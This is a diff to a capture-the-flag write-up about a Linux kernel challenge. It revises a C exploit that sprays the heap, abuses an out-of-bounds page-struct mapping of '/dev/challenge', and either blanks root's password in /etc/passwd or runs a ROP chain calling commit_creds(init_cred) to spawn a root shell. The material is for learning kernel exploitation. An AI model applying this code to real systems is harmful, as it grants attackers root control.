@@ -127,6 +127,7 @@ This solution is simpler and doesn't require control flow hijacking.
 ```c
 // https://github.com/n132/libx/tree/main
 // gcc main.c -o ./main -lx -w
+//gcc main.c -o ./main -lx -w
 #include "libx.h"
 #include <fcntl.h>
 #include <sys/mman.h>
@@ -136,15 +137,15 @@ This solution is simpler and doesn't require control flow hijacking.
 #if defined(LIBX)
     size_t user_cs, user_ss, user_rflags, user_sp;
     void saveStatus()
- {
+    {
         __asm__("mov user_cs, cs;"
                 "mov user_ss, ss;"
                 "mov user_sp, rsp;"
                 "pushf;"
                 "pop user_rflags;"
- );
+                );
         printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
- }
+    }
     size_t back2root = shell;
     void back2userImp(){
         __asm__("mov rax, user_ss;"
@@ -161,8 +162,8 @@ This solution is simpler and doesn't require control flow hijacking.
             "push 0;"
             "popfq;"
             "iretq;"
- );
- }
+            );
+    }
     // int sk_skt[SOCKET_NUM][2];
     int pipe_fd[PIPE_NUM][2];
     void libxInit(){
@@ -171,43 +172,83 @@ This solution is simpler and doesn't require control flow hijacking.
         saveStatus();
         // initSocketArray(sk_skt);
         initPipeBuffer(pipe_fd);
- }
+    }
 #endif // 
 int fd = 0;
+#define HAS_PASSWD 0
 int main(){
     libxInit();
     msgSpray(0x3d0,0x100-3,dp('i',0x3d0));
-    msgSpray(0xd0,0x100-3,dp('\x99',0x1d0));
+    msgSpray(0xd0,0x100-3,dp('\x99',0xd0));
     pipeBufferResize(pipe_fd[0][0],16);
     pipeBufferResize(pipe_fd[0][1],16);
     pipeBufferResize(pipe_fd[1][0],16);
     pipeBufferResize(pipe_fd[1][1],16);
 
- fd = open("/dev/challenge",2);
+    fd = open("/dev/challenge",2);
     pipeBufferResize(pipe_fd[2][0],16);
     pipeBufferResize(pipe_fd[2][1],16);
     pipeBufferResize(pipe_fd[3][0],16);
     pipeBufferResize(pipe_fd[3][1],16);
- __u8 *res = mmap(0xdeadbeef000,0x1000,0x7,1,fd,0x80000);
-    warn(hex(res));
+    __u8 *res = mmap(0xdeadbeef000,0x1000,0x7,1,fd,0x80000);
     
-    for(int i = 0 ; i < 0x4 ; i ++){
+    for(int i = 0  ; i < 0x4 ; i ++){
         close(pipe_fd[i][0]);
         close(pipe_fd[i][1]);
- }
-    // debug();
-    int fds[0x300] = {0}; 
-    for(int i = 0 ; i < 0x200 ; i++)
-        fds[i] = open("/etc/passwd",0);
-    unsigned int *file_mode = res+20;
-    *file_mode = 0x004f801f; // Change mode to writable;
-    for(int i = 0 ; i < 0x200 ; i++)
-        write(fds[i],"root::0:0:root:/root:/bin/sh\n",30);
-    system("/bin/su root");
+    }
+    if(HAS_PASSWD){
+        int fds[0x300] = {0}; 
+        for(int i = 0 ; i < 0x200 ; i++)
+            fds[i] = open("/etc/passwd",0);
+        unsigned int *file_mode = res+20;
+        *file_mode = 0x004f801f; // Change mode to writable;
+        for(int i = 0 ; i < 0x200 ; i++)
+            write(fds[i],"root::0:0:root:/root:/bin/sh\n",30);
+        system("/bin/su root");
+    }else{
+        int fds[0x300] = {0}; 
+        for(int i = 0 ; i < 0x40 ; i++)
+            fds[i] = open("/init",0);
+        // hexdump(res,0x100);
+        size_t base = *(size_t *)(res+0xb0)- (0xffffffff8221aac0-0xffffffff81000000);
+        size_t gadget = 0xffffffff81541983- NO_ASLR_BASE + base;
+        size_t heap = *(size_t *)(res+0x38);
+        success(base);
+        success(heap);
+        
+        size_t init_cred = 0xffffffff82a52ae0- NO_ASLR_BASE + base;
+        size_t commit_creds = 0xffffffff810c0610- NO_ASLR_BASE + base;
+        size_t rdi =  0xffffffff8127c369-NO_ASLR_BASE + base;
+        size_t * ptr = (size_t *)(res+0xb0);
+        *ptr = (heap&0xfffffffffffff000)+0x800800;
+        size_t *rop = (size_t *)(res);
+        size_t ct = 0 ; 
+        size_t pop = 0xffffffff8154198b- NO_ASLR_BASE + base;
+        rop[ct++]  = 0;
+        rop[ct++]  = pop;
+        ct++;
+        rop[ct++]  = rdi;
+        rop[ct++]  = init_cred;
+        ct++;
+        rop[ct++]  = commit_creds;
+        rop[ct++]  = 0xffffffff820015d0+103 - NO_ASLR_BASE + base;
+        rop[ct++]  = 0 ; 
+        rop[ct++]  = 0 ;
+        rop[ct++]  = shell;
+        rop[ct++]  = user_cs;
+        rop[ct++]  = user_rflags;
+        rop[ct++]  = user_sp;
+        rop[ct++]  = user_ss;
+        size_t *ops = calloc(1,0xfd0);
+        for(int i = 0 ; i < 0xfd0/8 ; i++)
+            ops[i] = gadget;
+        msgSpray(0x1fd0-1,0x400,ops);
+        for(int i = 0 ; i < 0x40 ; i ++)
+            close(fds[i]);
+    }
     debug();
 }
 ```
-
 
 # 0x06 Epilogue
 
@@ -222,6 +263,8 @@ In this challenge, I learned.
   - Reset Password
 - Exploit a Page Struct List OOB 
 - Misc about `mmap`/`mremap` and `vm_fault`
+
+
 
 
 
